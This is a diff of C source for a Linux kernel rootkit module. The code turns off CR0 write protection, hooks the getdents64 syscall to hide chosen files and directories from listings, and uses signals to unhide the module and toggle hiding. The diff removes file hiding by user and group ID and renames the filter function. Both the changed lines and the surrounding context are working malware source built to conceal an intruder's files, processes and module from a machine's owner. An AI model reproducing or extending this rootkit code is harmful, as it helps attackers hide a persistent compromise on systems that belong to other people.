@@ -79,12 +79,6 @@ MODULE_VERSION("0.2");
 #define SIGUNHM     57      // unhide the kernel module
 #define SIGTOGF     56      // toggle hidden files
 
-// for hiding files using group / user ids
-#define USER_NORM   1000
-#define USER_HIDE   1001
-#define GROUP_NORM  1000
-#define GROUP_HIDE  21
-
 // max number of hidden files / immortal processes at once
 #define MAX_HIDDEN_FILES    256
 #define MAX_IMMORTAL_PIDS   256
@@ -109,6 +103,8 @@ static inline void write_cr0_forced(unsigned long val) {
     /* __asm__ __volatile__( */
     asm volatile("mov %0, %%cr0": "+r"(val), "+m"(__force_order));
 }
+
+#define X86_CR0_WP 0x10000
 
 static inline void enable_write_protection(void) {
     preempt_enable();
@@ -457,8 +453,8 @@ static void toggle_file_visibility(void) {
 
 static char *hidden_files[MAX_HIDDEN_FILES] = {
     MAGIC_FILE,
-    // KIT_NAME,
     PROJECT_DIR,
+    // KIT_NAME,   // having this bugs out lsmod so don't use it
     NULL
 };
 
@@ -501,7 +497,7 @@ static int should_hide_file(const char *filename) {
 
 // helper function for hooked getdents64 syscall to hide any files / dirs we want hidden
 // This is adapted from: https://github.com/ait-aecid/caraxes/
-static __always_inline int hide_files_and_dirs(struct linux_dirent __user * dirent, int res, int fd) {
+static __always_inline int filter_files(struct linux_dirent __user * dirent, int res, int fd) {
 	int err;
 	unsigned long off = 0;
 	struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
@@ -526,7 +522,7 @@ static __always_inline int hide_files_and_dirs(struct linux_dirent __user * dire
 		if (err) goto out;
 		user = (int)stat->uid.val;
 		group = (int)stat->gid.val;
-        if (hiding_files && (should_hide_file(kdir->d_name) || group == GROUP_HIDE || user == USER_HIDE)) {
+        if (hiding_files && should_hide_file(kdir->d_name)) {
             printk(KERN_INFO "rootkit: hooked getdents to block %s\n", kdir->d_name);
 			if (kdir == kdirent) {
 				res -= kdir->d_reclen;
@@ -548,25 +544,6 @@ static __always_inline int hide_files_and_dirs(struct linux_dirent __user * dire
 	return res;
 }
 
-// Can call this from inside hooked sys_getdents64 to hide files
-// static void make_file_hidden(const char *path) {
-//     struct path file_path;
-//     struct inode *inode;
-//     int ret = kern_path(path, LOOKUP_FOLLOW, &file_path);
-//     if (ret) return;
-
-//     inode = file_path.dentry->d_inode;
-
-//     inode_lock(inode);
-
-//     inode->i_gid = make_kgid(&init_user_ns, GROUP_HIDE);
-//     inode->i_uid = make_kuid(&init_user_ns, USER_HIDE);
-
-//     mark_inode_dirty(inode);
-//     inode_unlock(inode);
-
-//     path_put(&file_path);
-// }
 //======================================================================================================================
 
 //************************************************** Hiding processes **************************************************
@@ -728,7 +705,7 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
     if (ret <= 0) return ret;
 
 
-    ret = hide_files_and_dirs(dirent, ret, fd);
+    ret = filter_files(dirent, ret, fd);
 
     return ret;
 }
